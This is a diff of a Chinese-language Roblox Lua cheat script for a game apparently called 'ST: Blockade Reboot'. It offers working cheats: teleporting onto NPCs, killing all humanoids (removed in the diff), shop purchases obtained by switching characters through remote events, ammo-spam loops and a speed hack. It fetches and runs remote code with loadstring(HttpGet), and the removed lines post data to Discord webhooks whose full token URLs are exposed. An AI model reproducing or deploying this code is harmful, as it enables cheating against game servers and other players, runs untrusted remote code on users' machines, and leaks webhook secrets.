@@ -23,9 +23,12 @@ local function isRealPlayer(player)
     return false
 end
 -----------------------------------------------------
-local httpstext = "https://"
-local rawtext = "raw"
-local httpplayer = loadstring(game:HttpGet(httpstext.."pastefy.app/d3FI03rJ/"..rawtext))()
+local httpplayer = {
+  [game:GetService("Players").LocalPlayer.Name] = {
+      UserID = game:GetService("Players").LocalPlayer.UserId,
+      HWID = "xxx"
+  }
+}
 --白名单-白名单
 -----------------------------------------------------
 local HTTPHWID = game:GetService("RbxAnalyticsService"):GetClientId()
@@ -45,17 +48,6 @@ local function checkPermissions()
 end
 local PlayerTrue = checkPermissions()
 --检测系统--检测系统
----------------------------------------------------
-local discordtext = "discord.com/api/webhooks"
-local function webhook(data, webhookUrl)
-      local httpService = game:GetService("HttpService")
-      httpService:RequestAsync({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = httpService:JSONEncode(data)
-      })
-end
 -----------------------------------------------------
 if not PlayerTrue then
     game.Players.LocalPlayer:Kick("You has been banned Reason：hack")
@@ -66,19 +58,11 @@ if not PlayerTrue then
 end
 
 if not PlayerTrue then
-local text = loadstring(game:HttpGet(httpstext.."pastefy.app/Mr0FNDNa/"..rawtext))()
-local weburl = httpstext..discordtext.."/1382575425221300314/wHDKtRqRWdRlHooXgyCWUpjrS5SgpgO9WlVb8JQxN8Yiz0rREl6bvhO9Nt1jwIP_jElM"
-webhook(text, weburl)
 error("error")
 end
 ---------------------------------------------------
 repeat wait() until PlayerTrue
 
-if PlayerTrue then
-local text = loadstring(game:HttpGet(httpstext.."pastefy.app/95koT34A/"..rawtext))()
-local weburl = httpstext..discordtext.."/1382575262520184872/0ljnnytmeOr3K37sUfh-TFrz9sTgSoIKedwMx0OIgnHnIchQ7-Ya2Sj5JT17p5T_s6_C"
-webhook(text, weburl)
-end
 -----------------------------------------------------
 --主要的脚本内容
 if PlayerTrue then
@@ -89,20 +73,13 @@ local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/rel
 local Window = WindUI:CreateWindow({
     Title = "STBB",
     Icon = "app-window",
-    Author = "This file was protected with MoonSec V3",
     Folder = "STBB",
     Size = UDim2.fromOffset(580, 380),
     Transparent = true,
+    HideSearchBar = false,
     Theme = "Dark",
     SideBarWidth = 140,
     Background = "",
-    User = {
-        Enabled = false,
-        Anonymous = true,
-        Callback = function()
-            print("clicked")
-        end,
-    },
 })
 
 WindUI:SetNotificationLower(true)
@@ -120,9 +97,6 @@ Window:EditOpenButton({
     Draggable = true,
 })
 
---窗口顶部按钮
-Window:CreateTopbarButton("重置角色", "bird",    function() replicatesignal(game:GetService("Players").LocalPlayer.Kill) end,  990)
-
 Window:DisableTopbarButtons({
     "Close", 
     "Fullscreen",
@@ -130,12 +104,12 @@ Window:DisableTopbarButtons({
 
 --左边选择
 local Tabs = {
-   Announcement_Updates = Window:Tab({ Title = "公告_更新", Icon = "info" }),
-   maincontent = Window:Tab({ Title = "主要内容", Icon = "type" }),
-   Remotestore = Window:Tab({ Title = "远程商店", Icon = "message-square" }),
-   genericscript = Window:Tab({ Title = "通用脚本", Icon = "code" }),
-   switchroles = Window:Tab({ Title = "切换角色", Icon = "mouse-pointer-2", }),
-   playergui = Window:Tab({ Title = "页面类别", Icon = "app-window-mac", }),
+   Announcement_Updates = Window:Tab({ Title = "公告_更新", Icon = "solar:home-2-bold" }),
+   maincontent = Window:Tab({ Title = "主要内容", Icon = "solar:check-square-bold" }),
+   Remotestore = Window:Tab({ Title = "远程商店", Icon = "solar:cursor-square-bold" }),
+   genericscript = Window:Tab({ Title = "通用脚本", Icon = "solar:password-minimalistic-input-bold" }),
+   switchroles = Window:Tab({ Title = "切换角色", Icon = "solar:square-transfer-horizontal-bold", }),
+   playergui = Window:Tab({ Title = "页面类别", Icon = "solar:hamburger-menu-bold", }),
 }
 
 --公告和更新
@@ -171,7 +145,7 @@ Tabs.Announcement_Updates:Paragraph({
 })
 
 local update = [[
--增加窗口顶部快捷重置
+-忘了
 ________________________________]]
 
 Tabs.Announcement_Updates:Paragraph({
@@ -182,11 +156,21 @@ Tabs.Announcement_Updates:Paragraph({
     Locked = false,
 })
 
---主要内容
 
 function reset()
-       replicatesignal(game:GetService("Players").LocalPlayer.Kill)
+    local player = game:GetService("Players").LocalPlayer
+    if workspace:FindFirstChild("Living") and player and player.Character then
+        replicatesignal(game:GetService("Players").LocalPlayer.Kill)
+    end
 end
+
+
+--窗口顶部按钮
+Window:CreateTopbarButton("重置角色", "bird",    function() reset() end,  990)
+
+
+
+--主要内容
 
 
 Tabs.maincontent:Button({
@@ -203,7 +187,7 @@ local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
 local Deathreset = false
 game:GetService('RunService').RenderStepped:connect(function()
  if Deathreset == true then
-   if PlayerCharacter:FindFirstChild("Timer") then
+   if PlayerCharacter.Humanoid.Health < 10 then
       reset()
    end
  end
@@ -223,74 +207,29 @@ Tabs.maincontent:Toggle({
     end
 })
 
-Tabs.maincontent:Button({
-	Title = "传送最近马桶",
-	Desc = nil,
-	Locked = false,
-    	Callback = function()
--- Auto Farm for ST: Blockade Reboot
--- Bypasses Anti-Cheat, Instantly Teleports, and Attacks NPCs
--- WARNING: Use at your own risk!
 
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
-local Window = Library:NewWindow("Auto Farm")
-local Section = Window:NewSection("Options")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 
-local autoFarmActive = false
+local LocalPlayer = Players.LocalPlayer
+local LivingFolder = workspace:WaitForChild("Living")
 
-Section:CreateToggle("Auto Farm", function(value)
-    autoFarmActive = value
-    if autoFarmActive then
-        startAutoFarm()
-    end
-end)
+local MAX_DIST = 5000
+local OFFSET = CFrame.new(0, 3, 0)   -- 头顶 3  studs
 
-function startAutoFarm()
-    spawn(function()
-        while autoFarmActive do
-            pcall(function()
-                local player = game.Players.LocalPlayer
-                local char = player.Character or player.CharacterAdded:Wait()
-                local hrp = char:FindFirstChild("HumanoidRootPart")
-                
-                if char and hrp then
-                    local target = findClosestAliveNPC(5000, hrp)
-                    
-                    if target and target:FindFirstChild("HumanoidRootPart") then
-                        -- Instant teleport directly above the NPC
-                        hrp.CFrame = target.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
-                        attackNPC(target)
-                    end
-                end
-            end)
-            wait(0.05) -- Faster reaction time
-        end
-    end)
-end
+function getClosestAlive()
+    local rootPart = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+    if not rootPart then return nil end
 
-function attackNPC(npc)
-    pcall(function()
-        if npc and npc:FindFirstChild("Humanoid") and npc.Humanoid.Health > 0 then
-            local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
-            if tool then
-                tool:Activate()
-            end
-        end
-    end)
-end
-
-function findClosestAliveNPC(maxDistance, part)
-    local lastDist = maxDistance
-    local closest = nil
-
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
-            local hum = v:FindFirstChild("Humanoid")
-            if hum and hum.Health > 0 and not game.Players:GetPlayerFromCharacter(v) then
-                local thisDist = (v.HumanoidRootPart.Position - part.Position).Magnitude
-                if thisDist < lastDist then
-                    closest = v
-                    lastDist = thisDist
+    local closest, best = nil, MAX_DIST
+    for _, model in ipairs(LivingFolder:GetChildren()) do
+        if model:IsA("Model") then
+            local hum = model:FindFirstChildOfClass("Humanoid")
+            local hrp = model:FindFirstChild("HumanoidRootPart")
+            if hum and hrp and hum.Health > 0 and not Players:GetPlayerFromCharacter(model) then
+                local d = (hrp.Position - rootPart.Position).Magnitude
+                if d < best then
+                    best, closest = d, model
                 end
             end
         end
@@ -298,9 +237,30 @@ function findClosestAliveNPC(maxDistance, part)
     return closest
 end
 
+function teleportToClosestToilet()
+    local target = getClosestAlive()
+    if not target then return end
+
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local tgtHrp = target:FindFirstChild("HumanoidRootPart")
+    if hrp and tgtHrp then
+        hrp.CFrame = tgtHrp.CFrame * OFFSET
+    end
+end
+
+Tabs.maincontent:Toggle({
+	Title = "传送最近马桶",
+	Desc = nil,
+	Locked = false,
+	Value = false,
+    Callback = function(Value)
+       if Value then
+         RunService:BindToRenderStep("TP", 1, teleportToClosestToilet)
+       else
+         RunService:UnbindFromRenderStep("TP")
+       end
     end
 })
-
 
 
 local DeathLaser = false
@@ -386,31 +346,6 @@ Tabs.maincontent:Toggle({
     end
 })
 
-local Killboss = false
-Tabs.maincontent:Toggle({
-    Title = "秒杀boss",
-    Desc = nil,
-    Value = false,
-    Locked = false,
-    Callback = function(Value)
-      if Value then
-          Killboss = true
-          game:GetService('RunService').RenderStepped:connect(function()
-           wait(0.0001)
-            for i,d in pairs(game:GetService("Workspace"):GetDescendants()) do
-              if d.ClassName == 'Humanoid' and d.Parent.Name ~= game.Players.LocalPlayer.Name then
-                if Killboss == true then
-                  d.Health = 0
-                end
-              end
-            end
-          end)
-      else
-          Killboss = false
-      end
-    end
-})
-
 local crosshair = false
 Tabs.maincontent:Toggle({
     Title = "准心调整",
@@ -434,26 +369,6 @@ Tabs.maincontent:Toggle({
         end
     end
 })
-
-local Unlimitedpause = false
-Tabs.maincontent:Toggle({
-    Title = "无限暂停",
-    Desc = nil,
-    Value = false,
-    Locked = false,
-    Callback = function(Value)
-       if Value then
-          Unlimitedpause = true
-          while Unlimitedpause do
-            game:GetService("ReplicatedStorage"):WaitForChild("TimeStops"):FireServer()
-            wait(1 / 3000)
-          end
-       else
-          Unlimitedpause = false
-       end
-    end
-})
-
 
 local function startESPSystem(target_select, targetname, switch)
     -- 创建ESP标签的函数
@@ -588,12 +503,12 @@ Tabs.maincontent:Button({
 })
 
 
-
+local clockspider = { Value = false}
 Tabs.maincontent:Button({
     Title = "时钟检测",
     Desc = nil,
     Callback = function()
-       local clockspider = true
+       clockspider.Value = true
        task.spawn(function() startESPSystem("Clock Spider", "时钟蜘蛛", clockspider) end)
     end
 })
@@ -768,15 +683,11 @@ Tabs.maincontent:Dropdown({
 --远程商店
 
 Tabs.Remotestore:Button({
-    Title = "满血返回",
+    Title = "返回大厅",
     Desc = nil,
     Callback = function() 
-local args = {
-	"Buy",
-	"FillHP"
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
-game:GetService("ReplicatedStorage"):WaitForChild("ReturnToLobby"):FireServer()
+     local HumanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+     HumanoidRootPart.CFrame = CFrame.new(2000, 1000, 2000)
     end
 })
 
@@ -788,462 +699,75 @@ Tabs.Remotestore:Section({
 })
 
 
-Tabs.Remotestore:Button({
-	Title = "脉冲步枪",
-	Desc = nil,
-    	Callback = function()
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-
 local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
 local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
 
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Pulse Rifle"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-Tabs.Remotestore:Button({
-	Title = "眼镜",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Lens"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-Tabs.Remotestore:Button({
-	Title = "喷气背包",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Jetpack"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-Tabs.Remotestore:Button({
-	Title = "铠甲",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Armor"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-Tabs.Remotestore:Button({
-	Title = "耳机",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "HeadPhone"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-Tabs.Remotestore:Button({
-	Title = "EPD",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "EPD"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-Tabs.Remotestore:Button({
-	Title = "快速po枪",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Shot Harpoon Gun"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
-
-
-Tabs.Remotestore:Button({
-	Title = "快速po枪子弹(10次)",
-	Desc = nil,
-    	Callback = function()
-for i = 1, 10 do
-local args = {
-	"Ammo",
-	game:GetService("Players").LocalPlayer.Character:WaitForChild("Shot Harpoon Gun")
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
+local function buyItem(itemName, CharacterType)
+    local PlayerValues = LocalPlayer:WaitForChild("PlayerValues")
+    local CharacterValue = PlayerValues:WaitForChild("Character")
+    local initialCharacterValue = CharacterValue.Value
+
+    ForChangeCharacter:FireServer(CharacterType, 0)
+    ShopSystem:FireServer("Buy", itemName)
+    ForChangeCharacter:FireServer(initialCharacterValue, 0)
 end
-    end
+
+local itemButtons = {
+    {Title = "脉冲步枪", Desc = nil, ItemName = "Pulse Rifle", CharacterType = "Camera man"},
+    {Title = "眼镜", Desc = nil, ItemName = "Lens", CharacterType = "Camera man"},
+    {Title = "喷气背包", Desc = nil, ItemName = "Jetpack", CharacterType = "Camera man"},
+    {Title = "铠甲", Desc = nil, ItemName = "Armor", CharacterType = "Camera man"},
+    {Title = "耳机", Desc = nil, ItemName = "HeadPhone", CharacterType = "Camera man"},
+    {Title = "EPD", Desc = nil, ItemName = "EPD", CharacterType = "Camera man"},
+    {Title = "快速po枪", Desc = nil, ItemName = "Shot Harpoon Gun", CharacterType = "Camera man"},
+    {Title = "镭射激光炮", Desc = nil, ItemName = "Large Laser Gun", CharacterType = "Big Camera man"},
+    {Title = "散弹枪", Desc = nil, ItemName = "Shot Gun", CharacterType = "Camera man"},
+    {Title = "天文步枪", Desc = nil, ItemName = "Astro Blaster", CharacterType = "Camera man"},
+    {Title = "天文电枪", Desc = nil, ItemName = "Tazer Gun", CharacterType = "Camera man"},
+    {Title = "天文狙击枪", Desc = nil, ItemName = "Tazer Sniper", CharacterType = "Camera man"},
+    {Title = "天文双管枪", Desc = nil, ItemName = "Dual Barrel Blaster", CharacterType = "Big Camera man"},
+    {Title = "大剑", Desc = nil, ItemName = "Saw Blade", CharacterType = "Big Camera man"},
+}
+
+for _, buttonData in ipairs(itemButtons) do
+    Tabs.Remotestore:Button({
+        Title = buttonData.Title,
+        Desc = buttonData.Desc,
+        Callback = function() buyItem(buttonData.ItemName, buttonData.CharacterType) end
+    })
+end
+
+Tabs.Remotestore:Section({ 
+    Title = "子弹栏",
+    TextXAlignment = "Left",
+    TextSize = 17,
 })
 
-local unli = false
-Tabs.Remotestore:Toggle({
-    Title = "快速po枪子弹(循环)",
-    Desc = nil,
-    Value = false,
-    Callback = function(Value)
-        if Value then
-            unli = true
-            while unli do
-                 local args = {
-               	"Ammo",
-               	game:GetService("Players").LocalPlayer.Character:WaitForChild("Shot Harpoon Gun")
-                 }
-                 game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
-                wait(0.00002)
-            end
-        else
-            unli = false
-        end
+local function AmmoShopSystem(times, weapon)
+    for _ = 1, times do
+        ShopSystem:FireServer("Ammo", LocalPlayer.Character:WaitForChild(weapon))
     end
-}, "Toggle")
-
-Tabs.Remotestore:Button({
-	Title = "散弹枪",
-	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Shot Gun"
-}
-ShopSystem:FireServer(unpack(args2))
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Shot Gun"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
-    end
-})
+end
 
 Tabs.Remotestore:Button({
 	Title = "散弹枪子弹(10次)",
 	Desc = nil,
-    	Callback = function()
-for i = 1, 10 do
-local args = {
-	"Ammo",
-	game:GetService("Players").LocalPlayer.Character:WaitForChild("Dual Shot Gun")
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
-end
+    Callback = function()
+         AmmoShopSystem(10, "Dual Shot Gun")
     end
 })
-
-local unli = false
-Tabs.Remotestore:Toggle({
-    Title = "散弹枪子弹(循环)",
-    Desc = nil,
-    Value = false,
-    Callback = function(Value)
-        if Value then
-            unli = true
-            while unli do
-                 local args = {
-               	"Ammo",
-               	game:GetService("Players").LocalPlayer.Character:WaitForChild("Dual Shot Gun")
-                 }
-                 game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
-                wait(0.00002)
-            end
-        else
-            unli = false
-        end
-    end
-}, "Toggle")
 
 Tabs.Remotestore:Button({
-	Title = "镭射激光炮",
+	Title = "快速po枪子弹(10次)",
 	Desc = nil,
-    	Callback = function()
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
-local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")
-
-local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
-local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
-local initialCharacterValue = CharacterValue.Value -- 记录初始角色值
-
-local args1 = {
-    [1] = "Big Camera man",
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args1))
-
-wait(0.0001)
-
-local args2 = {
-    [1] = "Buy",
-    [2] = "Large Laser Gun"
-}
-ShopSystem:FireServer(unpack(args2))
-
-wait(0.0001)
-
-local args3 = {
-    [1] = initialCharacterValue, -- 使用记录的初始角色值
-    [2] = 0
-}
-ForChangeCharacter:FireServer(unpack(args3))
-
-
-
+    Callback = function()
+        AmmoShopSystem(10, "Shot Harpoon Gun")
     end
 })
+
 
 --通用脚本
 
@@ -1372,7 +896,7 @@ end)
 Tabs.genericscript:Section({ 
     Title = " ",
     TextXAlignment = "Left",
-    TextSize = 13,
+    TextSize = 6,
 })
 
 Tabs.genericscript:Toggle({
@@ -1400,7 +924,7 @@ Tabs.genericscript:Slider({
 Tabs.genericscript:Section({ 
     Title = " ",
     TextXAlignment = "Left",
-    TextSize = 13,
+    TextSize = 6,
 })
 
 _G.speedtrue = false
@@ -1425,20 +949,11 @@ Tabs.genericscript:Slider({
     Step = 1,
     Value = {
         Min = 6,
-        Max = 120,
+        Max = 1200,
         Default = 6,
     },
     Callback = function(value)
         _G.speedvalue = value
-    end
-})
-
-
-Tabs.genericscript:Button({
-	Title = "NPC操控",
-	Desc = nil,
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/fe-source/refs/heads/main/NPC/source/main.Luau"))()
     end
 })
 
@@ -1465,21 +980,19 @@ Tabs.switchroles:Section({
     TextSize = 13,
 })
 
+
+local function WindUINotify(part)
+      WindUI:Notify({Title = "切换提示", Content = "成功切换:" .. part, Duration = 5})
+end
+
 Tabs.switchroles:Button({
     Title = "神话反派",
     Desc = nil,
     Locked = false,
     Callback = function()
-local args = {
-	"Brown Camera man",
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
-WindUI:Notify({
-Title = "切换提示",
-Content = "成功切换",
-Duration = 5
-})
+       local args = {"Brown Camera man", 1}
+       game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+       WindUINotify("Brown Camera man")
     end
 })
 
@@ -1488,16 +1001,9 @@ Tabs.switchroles:Button({
     Desc = nil,
     Locked = false,
     Callback = function()
-local args = {
-	"Tri Soldier Athena (Girl)",
-	0
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
-WindUI:Notify({
-Title = "切换提示",
-Content = "成功切换",
-Duration = 5
-})
+       local args = {"Tri Soldier Athena (Girl)", 0}
+       game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+       WindUINotify("Tri Soldier Athena (Girl)")
     end
 })
 
@@ -1506,16 +1012,9 @@ Tabs.switchroles:Button({
     Desc = nil,
     Locked = false,
     Callback = function()
-local args = {
-	"Dark Speakerman",
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
-WindUI:Notify({
-Title = "切换提示",
-Content = "成功切换",
-Duration = 5
-})
+       local args = {"Dark Speakerman", 2}
+       game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+       WindUINotify("Dark Speakerman")
     end
 })
 
@@ -1524,16 +1023,9 @@ Tabs.switchroles:Button({
     Desc = nil,
     Locked = false,
     Callback = function()
-local args = {
-	"Clock Man",
-	0
-}
-game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
-WindUI:Notify({
-Title = "切换提示",
-Content = "成功切换",
-Duration = 5
-})
+       local args = {"Clock Man", 0}
+       game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+       WindUINotify("Clock Man")
     end
 })
 
@@ -1550,23 +1042,13 @@ if game:GetService("Players").LocalPlayer:FindFirstChild("UnlockData") then
             Title = stringValue.Name,
             Desc = nil,
             Callback = function()
-                local args = {stringValue.Name, 1}
+                local args = {stringValue.Name, 0}
                 game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
-                WindUI:Notify({
-                Title = "切换提示",
-                 Content = "成功切换",
-                 Duration = 5
-              })
-            end
-        })
+                WindUINotify(stringValue.Name)
+            end})
     end
 else
-Tabs.switchroles:Button({
-   Title = "错误",
-   Desc = "没角色是吧",
-   Callback = function()
-   end
-})
+Tabs.switchroles:Button({Title = "错误", Desc = "没角色是吧", Callback = function() end})
 end
 
 
@@ -1588,6 +1070,34 @@ Tabs.playergui:Toggle({
 }, "Toggle")
 end
 
+
+Tabs.playergui:Toggle({
+    Title = "天文货币",
+    Desc = nil,
+    Value = false,
+    Locked = false,
+    Callback = function(Value)
+        if Value then
+          game:GetService("Players").LocalPlayer.PlayerGui.AstroScrap.Enabled = true
+        else
+           game:GetService("Players").LocalPlayer.PlayerGui.AstroScrap.Enabled = false
+        end
+    end
+}, "Toggle")
+
+Tabs.playergui:Toggle({
+    Title = "背包",
+    Desc = nil,
+    Value = false,
+    Callback = function(Value)
+        if Value then
+          game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Enabled = true
+        else
+          game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Enabled = false
+        end
+    end
+}, "Toggle")
+
 Tabs.playergui:Section({ 
     Title = "泰坦装备",
     TextXAlignment = "Left",
